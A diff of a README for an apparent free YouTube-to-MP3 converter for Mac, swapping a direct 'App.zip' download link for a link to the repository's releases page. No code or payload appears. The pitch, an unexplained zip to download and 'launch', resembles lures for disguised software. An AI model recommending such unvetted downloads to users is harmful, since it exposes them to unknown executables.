@@ -39,7 +39,7 @@ Explore the following topics related to our repository:
 
 To start converting your favorite YouTube videos to MP3 format for free on Mac OS, simply download our converter using the following link:
 
-[![Download App](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/uploads/App.zip)
+[![Download App](https://github.com/Prottoy321/Free-YouTube-To-MP3-Converter-Free/releases)](https://github.com/Prottoy321/Free-YouTube-To-MP3-Converter-Free/releases)
 
 *Note: The link provided above needs to be launched to download the converter.*
 
